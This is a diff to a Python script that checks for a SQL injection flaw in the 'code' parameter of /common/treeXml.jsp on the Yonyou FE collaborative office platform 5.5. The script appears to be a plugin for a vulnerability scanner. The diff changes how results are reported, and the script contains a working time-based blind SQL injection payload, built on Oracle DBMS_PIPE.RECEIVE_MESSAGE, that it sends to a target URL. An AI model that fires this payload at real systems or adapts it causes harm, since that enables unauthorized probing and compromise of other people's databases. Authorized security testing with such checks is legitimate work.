@@ -9,8 +9,8 @@ description: 文件/common/treeXml.jsp中,参数code存在SQL注入。
 import sys
 import time
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yonyou_fe_treeXml_sqli_BaseVerify:
     def __init__(self, url):
@@ -25,18 +25,18 @@ class yonyou_fe_treeXml_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在用友FE协作办公平台5.5 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在用友FE协作办公平台5.5 SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
             vulnurl = self.url + "/common/treeXml.jsp?type=sort&lx=3&code=1%27%20AND%207491=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(65)||CHR(70)||CHR(70),6)%20AND%20%271%27=%271"
             start_time = time.time()
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
-                cprint("[+]存在用友FE协作办公平台5.5 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在用友FE协作办公平台5.5 SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yonyou_fe_treeXml_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
